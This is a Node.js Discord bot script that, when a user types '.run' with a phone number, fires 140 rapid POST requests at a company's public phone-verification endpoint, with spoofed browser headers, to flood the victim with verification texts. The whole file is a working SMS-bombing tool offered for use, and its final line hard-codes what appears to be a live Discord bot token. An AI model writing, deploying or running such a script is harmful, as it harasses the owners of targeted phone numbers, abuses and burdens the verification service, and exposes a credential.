const axios = require('axios');
const sleep = (ms) => { return new Promise((r) => { setTimeout(r, ms) }) }
function sendTo(num, amt, interval = 3000) {
  return new Promise(async (res, rej) => {
    if (typeof (parseInt(num)) !== typeof (1)) res();
    const body = { phoneNumber: num.toString() };
    const headers = {
      headers: {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "pragma": "no-cache",
        "sec-ch-ua": "\"Chromium\";v=\"104\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"104\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"macOS\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "x-app-version": "web-0.12.3",
        "user-agent": "Mozilla/6.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
      }
    };
    const ep = "https://prod-api.154310543964.hellopublic.com/userservice/public/phone-number-verification"
    let count = 0
    let isnotdone = true
    const x = setInterval(() => {
      axios.post(ep, body, headers).then(() => { count++ }).catch(() => { count-- })
      console.log("Amount: %d", count)
    }, interval)
    const inter = setInterval(() => {
      if (count >= amt) {
        clearInterval(inter);
        clearInterval(x)
        res(true)
      }
    })
  })
}


const discord = require('discord.js');
const client = new discord.Client();

client.on('ready', () => {
  console.log("Onliene!")
})

let RunningJob = false
let Cooldown = false
client.on('message', async m => {
  if (m.author.bot) return;
  if (!m.guild) return;
  if (!m.content) return; // stickers etc check
  if (!m.content.includes('.')) { return }
  if (m.content.split(' ')[0] == '.run') {
    if (RunningJob) {
      return m.reply('\n> Error, currently running a job. Wait around 8-20 seconds (from original job creation).')
    }
    if (Cooldown) {
      return m.reply('\nError, bot is on a cooldown to prevent ratelimiting.')
    }
    const start = new Date()
    const args = m.content.split(' ');
    const num = args[1]
    RunningJob = true
    m.channel.send("Created phone job for <@" + m.author.id + '>!\n> **Amount**: `140`\n> **Interval**(ms): `20ms`\n> **Estimated Time**: `8-20 seconds`\n> **Effect / Recieve Time**: `2-3 Minutes`')
    sendTo(num, 140, 20).then(() => { Cooldown = true; m.reply("\n> Command success!\n> Cooldown: `10s`\n> Took: " + (((new Date()) - start) / 1000).toString() + ' seconds to execute job.'); RunningJob = false; setTimeout(() => { Cooldown = false; m.channel.send("Cooldown: **Done**!\nTime: 10s") }, 10000) }).catch(() => { m.reply("\n> Error finishing job.\n> Cooldown: `30s`"); Cooldown = true; RunningJob = false; setTimeout(() => { Cooldown = false }, 70000) })
  }
})
client.login("MTA0NzI2ODkwNjUxNzEzNTM5MA.GYChkD.f3Bsfed4LtUOGkzbBeNayJG_UVbbcMLBVyFoPU")